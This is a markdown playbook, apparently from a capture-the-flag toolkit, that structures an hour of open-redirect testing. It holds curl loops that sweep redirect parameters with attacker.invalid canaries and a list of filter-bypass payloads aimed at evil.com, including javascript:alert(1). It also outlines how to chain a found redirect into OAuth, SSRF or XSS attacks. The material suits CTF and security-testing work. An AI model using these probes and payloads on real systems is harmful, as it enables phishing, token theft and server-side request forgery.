# First hour — the structured 60-minute open-redirect engagement

## Minute 0-10 — the recon

```bash
# the tool self-test
python3 tools/web/redirect_probe.py --selftest
# the app's redirect vocabulary
curl -s "$BASE/" | grep -oiE '(next|redirect|return|url|redir|goto|continue|callback|target|out|link|back|RelayState)[="]'
# the endpoint inventory — which redirect-prone flows exist
for ep in /login /logout /oauth/authorize /sso /out /goto /link /back \
          /redirect /return /error /share /img /fetch; do
  code=$(curl -si -o /dev/null -w '%{http_code}' --max-time 5 "$BASE$ep")
  echo "$code $ep"
done
```

## Minute 10-25 — the param × endpoint matrix

```bash
for ep in /login /logout /oauth/authorize /out /goto /back /error; do
  for p in next url redir redirect return returnTo goto continue callback to out link back RelayState; do
    loc=$(curl -si --max-time 5 "$BASE$ep?$p=https%3A%2F%2Fattacker.invalid" \
          | grep -i '^location' | head -1)
    [ -n "$loc" ] && echo "[SIGNAL] $ep ?$p -> $loc"
  done
done
```

Every `[SIGNAL]` is a param reaching a `Location:` — the surface list.

## Minute 25-40 — the fingerprint + the arms

```bash
# the ONE canary on the signal-bearing param
curl -si "$BASE/login?next=https%3A%2F%2Fattacker.invalid" | grep -i '^location'
# -> the fingerprint names the filter -> the arms
# the arm sweep — the filter-shape-specific arms
for arm in '//evil.com' '/\evil.com' '\\evil.com' '/%5cevil.com' \
  'https://target.com@evil.com' 'evil.com\@target.com' \
  'https://target.com.evil.com' 'https://evil.com/target.com' \
  'https:evil.com' 'https%3a%2f%2fevil.com' 'javascript:alert(1)'; do
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$arm")
  echo "== $arm =="
  curl -si "$BASE/login?next=$enc" | grep -i '^location'
done
```

## Minute 40-50 — the verdict

```text
a Location: <canary> -> post-probe confirms --evidence-kind class
a Location: <safe> on all arms -> the class falsifier -> record the arms
no Location -> the vocabulary sweep / a different carrier
```

## Minute 50-60 — the chain + the record

```bash
# the chain-route — the laundered trust
# - the OAuth launder: is the open-redirect on an allowlisted domain?
# - the SSRF: does a fetcher follow the Location?
# - the XSS: does a javascript:/data: reach a sink?
# - the bot: does a bot visit the URL?
# the record — post-probe each verdict
python3 tools/hooks.py post-probe <challenge> --hypothesis-id <id> \
  --class web-open-redirect --verdict confirms --evidence-kind class \
  --evidence 'Location: https://attacker.invalid' --response '<the 302>'
```

## The hour's discipline

- ONE param, ONE carrier, ONE arm at a time
- the verbatim `Location:` is the oracle — `curl -si` + `grep -i location`
- the fingerprint names the arms — don't blind-sweep
- a uniform `Location: <safe>` closes the surface — record the arms tried
- a confirmed canary routes to `chain-routes.md` for the flag-path
